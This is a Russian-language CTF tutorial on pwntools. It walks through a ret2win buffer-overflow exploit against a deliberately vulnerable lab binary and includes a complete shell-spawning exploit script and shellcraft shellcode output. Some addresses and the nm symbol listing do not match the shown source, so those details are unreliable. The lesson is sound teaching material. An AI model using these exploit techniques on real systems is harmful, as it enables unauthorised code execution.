## Вопрос, с которого всё начинается

В прошлом уроке мы собрали ret2win руками: запускали GDB, смотрели `rip`, считали смещение, упаковывали адрес. Каждый раз повторять это утомительно, а на удалённом сервере GDB вообще нет. Нужна библиотека, которая делает всю рутину за нас.

Это и есть **pwntools** — набор Python-функций для написания эксплойтов. Установка обычная:

```bash
$ pip install pwntools
```

Дальше — весь урок на одном примере: автоматизируем эксплуатацию того же бинаря `vuln` из прошлого урока.

## Наш пример: тот же vuln, но по-взрослому

```c
// vuln.c
#include <stdio.h>
#include <stdlib.h>
void win(void) { system("/bin/sh"); }
int main(void) {
    char buf[64];
    gets(buf);
    puts(buf);
    return 0;
}
```

```bash
$ gcc -fno-stack-protector -no-pie -o vuln vuln.c
```

Наша цель — эксплойт, который одинаково работает и локально, и по сети.

## Шаг 1. context.binary — pwntools сам читает бинарь

Первая строка любого эксплойта — указать, с каким бинарём работаем:

```python
from pwn import *
context.binary = elf = ELF('./vuln')
```

Присваивание `context.binary` заставляет pwntools запомнить архитектуру, разрядность и endianness. Теперь `p64` сам знает, что паковать в 8 байт little-endian, а `shellcraft` — какой ассемблер использовать. Объект `elf` умеет доставать символы:

```python
>>> elf.symbols['win']
4198822
>>> hex(elf.symbols['win'])
'0x4011a6'
```

Строка `context.binary = elf = ELF(...)` — идиома: одна команда создаёт объект `elf` и сразу делает его контекстом.

## Шаг 2. Общаемся с процессом

Запустить локальную программу и говорить с ней как с сокетом:

```python
p = process('./vuln')     # запустить локально
p.sendline(b'hello')      # отправить строку + '\n'
print(p.recvline())       # прочитать одну строку
p.close()
```

Для удалённой задачи — ровно те же методы, меняется только запуск:

```python
p = remote('chal.ctf.example', 1337)
```

Отсюда стандартный приём — одна функция `start()`, которая выбирает локальную или удалённую цель по флагу командной строки:

```python
def start():
    if args.REMOTE:
        return remote('chal.ctf.example', 1337)
    return process('./vuln')
```

`args.REMOTE` — это «магия» pwntools: он разбирает аргументы командной строки. Запустишь `python3 exp.py REMOTE` — пойдёшь на сервер, без него — локально.

## Шаг 3. Находим смещение автоматически

Помнишь cyclic из прошлого урока? pwntools умеет не только генерировать паттерн, но и считать смещение прямо из значения регистра:

```python
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaaha...'
>>> cyclic_find(0x6161616b6161616a)
72
```

Если лень смотреть `rip` в GDB, можно заставить pwndbg сделать это автоматически — команда `cyclic` в отладчике сама подставит найденное значение.

## Шаг 4. Собираем payload через flat

Склеивать байты через `b'A'*72 + p64(win)` можно, но при сложных структурах это превращается в кашу. Есть удобная функция `flat`, которая раскладывает данные по заданным смещениям:

```python
payload = flat({
    72: elf.symbols['win'],   # по смещению 72 — адрес win
})
```

Если бы между буфером и возвратом лежала, скажем, canary, мы бы дописали её отдельным полем:

```python
payload = flat({72: canary, 80: elf.symbols['win']})
```

`flat` сам дополнит дырки байтами и упакует числа нужного размера.

## Шаг 5. Отладка через gdb.attach

Когда эксплойт не работает, pwntools умеет открыть GDB прямо в нужный момент:

```python
p = process('./vuln')
gdb.attach(p, gdbscript='''
    b *main+80
    c
''')
p.sendline(payload)
```

`gdb.attach(p)` подцепляется к живому процессу и останавливает его до тех пор, пока ты не продолжишь в отладчике. Ещё есть `gdb.debug('./vuln')`, который сразу запускает программу под GDB — удобно ставить брейкпоинты на старте.

## Шаг 6. Что ещё умеет pwntools

Кроме ручного конструирования payload, у pwntools есть модуль `ROP`, который сам ищет гаджеты и собирает цепочки. Ему достаточно сказать, что мы хотим вызвать:

```python
>>> rop = ROP(elf)
>>> rop.call('win')
>>> print(rop.dump())
0x0000:         0x40123b pop rdi; ret
0x0008:         0x4011a6 win
```

Видно, как библиотека сама подобрала гаджет `pop rdi; ret` и адрес `win`. Функция `rop.chain()` вернёт готовые байты цепочки, которые можно склеить с мусором и отправить.

Ещё один полезный модуль — `shellcraft`: он генерирует ассемблерный shellcode по имени. Например, `shellcraft.sh()` выдаёт код, который делает `execve("/bin/sh", 0, 0)`:

```python
>>> print(shellcraft.sh())
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    push 0x68
    mov  rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    ...
```

Если нужен shellcode под другую архитектуру, достаточно поменять `context.arch`, и `shellcraft` сгенерирует код уже для ARM или MIPS. Подробно этим займёмся в уроке `pwn-shellcode`.

## Шпаргалка по частым функциям

| Функция | Что делает |
|---|---|
| `ELF('./f')` | разбор символов, GOT/PLT, защит |
| `process('./f')` / `remote(h,p)` | запуск локально / подключение по сети |
| `sendline` / `recvline` | отправить строку / прочитать строку |
| `recvuntil(b'> ')` | читать до определённого маркера |
| `sendafter(b'> ', x)` | дождаться маркера и отправить |
| `cyclic` / `cyclic_find` | паттерн и поиск смещения |
| `p64` / `u64` | упаковать / распаковать 8 байт |
| `flat({off: val})` | собрать payload по смещениям |
| `ROP(elf)` | поиск гаджетов и сборка цепочки |
| `gdb.attach(p)` | подключить отладчик к процессу |
| `args.REMOTE` | флаг REMOTE из командной строки |

Этой шпаргалки хватает на большинство простых задач: почти каждый эксплойт — это комбинация `ELF`, `process`/`remote`, `flat` и `interactive`.

## Полный эксплойт

Соберём всё вместе. Обрати внимание: одна и та же логика для локального и удалённого запуска.

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')
OFFSET = 72
win = elf.symbols['win']

def start():
    if args.REMOTE:
        return remote('chal.ctf.example', 1337)
    return process('./vuln')

def exploit():
    p = start()
    payload = flat({OFFSET: win})
    p.sendline(payload)
    p.interactive()

exploit()
```

```bash
$ python3 exp.py
[*] '/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user)
```

`interactive()` переводит управление в режим живого общения с shell — можно печатать команды руками.

## Инструмент: nm — таблица символов

`nm` перечисляет символы бинарника: имена функций и глобальных переменных с их адресами. Если символы не срезаны, это самый быстрый способ найти нужную функцию.

Ключи, которые пригодятся:
* `nm <файл>` — все символы с адресами;
* `nm -C <файл>` — демутируй C++-имена (читаемые сигнатуры);
* `T`/`t` — код (глобальный/локальный), `R`/`r` — только чтение (`.rodata`), `D`/`B` — данные;
* нижний регистр = локальный символ, верхний = глобальный/экспортируемый.

### Рабочий пример (как в лаборатории)

```
$ nm vuln
0000000000403000 B __bss_start
0000000000403000 B _edata
0000000000403008 B _end
000000000040118a T _start
0000000000401147 t exit0
0000000000401030 t put
0000000000401136 t putnl
000000000040107d t putx
0000000000401000 t sys3
0000000000401167 T win
0000000000403000 B win_target
```

Подсказка из лаборатории: `nm [-D] <файл>`.

## Что мы теперь знаем

- `context.binary = elf = ELF(...)` — одна строка настраивает pwntools под бинарь.
- `process()` и `remote()` дают одинаковый интерфейс: `sendline`, `recvline`, `recvuntil`.
- `cyclic_find()` автоматически считает смещение из значения регистра.
- `flat({offset: value})` раскладывает payload по смещениям и упаковывает числа.
- `gdb.attach()` и `gdb.debug()` подключают отладчик к живому процессу.
- `args.REMOTE` переключает эксплойт между локальной и сетевой целью.

## Куда дальше

Эксплойт стал коротким, но мы всё ещё «верим на слово», что падаем именно туда, куда думаем. В следующем уроке разберём `pwn-gdb-pwndbg` — как системно смотреть стек, регистры и кучу, и как из отладчика быстро понимать, почему цепочка не сработала. А главное запомни: **pwntools — это переводчик между твоими идеями и байтами; он не думает за тебя, но убирает всю рутину.**

## Где пригодится

- **CTF Pwn:** без pwntools не обходится почти ни один эксплойт — от ret2win до heap-задач.
- **Автоматизация эксплуатации:** один скрипт запускается и локально, и против удалённого сервиса.
- **Разработка эксплойтов:** `flat`, `cyclic`, `ROP` и `ELF` экономят часы ручной работы.
- **Обучение:** чужой эксплойт на pwntools читается как обычный Python, а не как головоломка.
